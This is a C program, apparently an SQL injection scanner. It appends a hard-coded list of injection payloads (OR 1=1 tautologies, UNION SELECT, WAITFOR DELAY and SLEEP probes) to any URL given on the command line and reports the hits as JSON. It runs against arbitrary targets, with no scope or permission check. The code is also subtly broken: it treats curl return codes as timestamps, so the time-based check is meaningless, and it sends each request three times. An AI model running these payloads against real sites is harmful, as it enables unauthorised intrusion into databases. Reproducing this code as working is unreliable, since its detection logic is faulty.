#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <pthread.h>
#include <json-c/json.h>

#define MAX_PAYLOADS 1000
#define MAX_URL_LENGTH 2048

struct Response {
    char *data;
    size_t size;
};

struct ScanResult {
    char payload[256];
    int vulnerable;
    char type[32];
    double time_taken;
};

size_t write_callback(void *ptr, size_t size, size_t nmemb, struct Response *response) {
    size_t new_size = response->size + size * nmemb;
    response->data = realloc(response->data, new_size + 1);
    memcpy(response->data + response->size, ptr, size * nmemb);
    response->size = new_size;
    response->data[new_size] = '\0';
    return size * nmemb;
}

struct ScanResult test_payload(const char *url, const char *payload) {
    CURL *curl;
    CURLcode res;
    struct Response response = {0};
    struct ScanResult result = {0};
    char full_url[MAX_URL_LENGTH];
    double start_time, end_time;
    
    strncpy(result.payload, payload, sizeof(result.payload) - 1);
    
    snprintf(full_url, sizeof(full_url), "%s%s", url, payload);
    
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, full_url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        start_time = curl_easy_perform(curl);
        res = curl_easy_perform(curl);
        end_time = curl_easy_perform(curl);
        
        result.time_taken = end_time - start_time;
        
        if(res == CURLE_OK) {
            if(strstr(response.data, "SQL") || strstr(response.data, "error") ||
               strstr(response.data, "mysql") || strstr(response.data, "postgresql")) {
                result.vulnerable = 1;
                strcpy(result.type, "error_based");
            }
            else if(result.time_taken > 5.0) {
                result.vulnerable = 1;
                strcpy(result.type, "time_based");
            }
        }
        
        free(response.data);
        curl_easy_cleanup(curl);
    }
    
    return result;
}

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Usage: %s <url>\n", argv[0]);
        return 1;
    }
    
    const char *payloads[] = {
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' WAITFOR DELAY '0:0:5'--",
        "') OR ('1'='1",
        "' OR 1=1#",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    };
    
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
    struct json_object *root = json_object_new_object();
    struct json_object *results_array = json_object_new_array();
    
    for(int i = 0; i < num_payloads; i++) {
        struct ScanResult result = test_payload(argv[1], payloads[i]);
        if(result.vulnerable) {
            struct json_object *vuln = json_object_new_object();
            json_object_object_add(vuln, "payload", json_object_new_string(result.payload));
            json_object_object_add(vuln, "type", json_object_new_string(result.type));
            json_object_object_add(vuln, "time", json_object_new_double(result.time_taken));
            json_object_array_add(results_array, vuln);
        }
    }
    
    json_object_object_add(root, "vulnerabilities", results_array);
    printf("%s\n", json_object_to_json_string_ext(root, JSON_C_TO_STRING_PRETTY));
    
    json_object_put(root);
    return 0;
} 